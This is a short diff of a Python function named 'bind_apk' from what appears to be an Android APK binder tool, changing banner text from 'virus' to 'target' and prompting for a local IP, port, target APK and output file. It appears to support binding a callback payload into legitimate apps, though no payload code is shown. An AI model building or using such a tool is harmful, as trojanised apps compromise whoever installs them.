@@ -37,12 +37,12 @@ def bind_apk():
       _____
      "     "  Bind Aplication
     | () () | just relax and enjoy :)
-     \  ^  /  if your virus in another path
-      |||||   input your virus server using /
+     \  ^  /  if your target in another path
+      |||||   input your target bind using /
       |||||   (example : a/b.apk)
     ''' + werno.biasa)
     load()
-    ip_l = input(werno.biasa+"your ip local : ")
+    ip_l = input("your ip local : ")
     ip_p = input("your port : ")
     sl_file = input("input your file apk target (.apk) : ")
     out_file = input("filname output : ")
